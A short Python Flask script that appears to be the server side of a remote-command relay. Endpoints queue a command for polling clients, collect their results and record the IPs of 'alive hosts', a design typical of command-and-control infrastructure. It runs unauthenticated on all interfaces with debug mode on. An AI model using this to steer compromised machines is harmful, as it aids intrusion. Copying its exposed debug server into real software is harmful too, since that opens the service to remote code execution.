#!/usr/bin/env python3

from flask import Flask, request
import json
class Server:
    def __init__(self):
        self.app = Flask(__name__)
        self.command = None
        self.result = None
        self.alive_hosts = []
        
        @self.app.route("/commands", methods=["GET"])
        def listen_commands():
            if self.command:
                return self.command
            else:
                return ""

        @self.app.route("/commands", methods=["POST"])
        def send_commands():
            cmd = request.data.decode("utf-8")
            try:
                self.command = cmd
                return "OK"
            except Exception as e:
                return "ERROR: " + str(e)

        @self.app.route("/results", methods=["GET"])
        def listen_results():
            if self.result:
                res = self.result
                self.result = None
                self.command = None  # Reset command after every GET /result
                return res
            else:
                return ""

        @self.app.route("/results", methods=["POST"])
        def send_results():
            res = request.data.decode("utf-8")
            try:
                self.result = res
                return ""
            except Exception as e:
                return "ERROR: " + str(e)

        @self.app.route("/alive_hosts", methods=["GET"])
        def listen_alive_hosts():
            if self.alive_hosts:
                hosts = self.alive_hosts
                self.alive_hosts = []
                return json.dumps(hosts)
            else:
                return ""
        
        @self.app.route("/alive_hosts", methods=["POST"])
        def send_alive_hosts():
            ip = request.data.decode("utf-8")
            if ip not in self.alive_hosts:
                self.alive_hosts.append(ip)
            return ""
    def start(self):
        ip = "0.0.0.0"
        port = 8080
        self.app.run(host=ip, port=port, debug=True)

if __name__ == "__main__":
    server = Server()
    server.start()